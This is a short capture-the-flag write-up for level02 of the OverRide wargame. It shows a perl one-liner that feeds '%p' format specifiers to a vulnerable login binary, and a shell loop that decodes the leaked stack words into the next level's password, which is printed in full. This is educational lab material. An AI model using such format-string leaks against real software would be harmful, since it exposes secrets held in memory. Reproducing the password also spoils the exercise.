# level02

The binary compares our input to the data of `/home/users/level03/.pass`.

```
level02@OverRide:~$ perl -e 'print "%p "x30 . "\n"' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```
The program will print our input username by calling `printf` directly with our input as format string. So we can use the uncontrolled format string to show us the values of stack which contains the buffer who holds the password data.

```
level02@OverRide:~$ pass="0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d"
level02@OverRide:~$ for fragment in $pass
> do
> echo $fragment | xxd -r | rev | tr -d "\n"
> done; echo
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
The password data in the stack is in little endian format. After reversing it, we got the password.
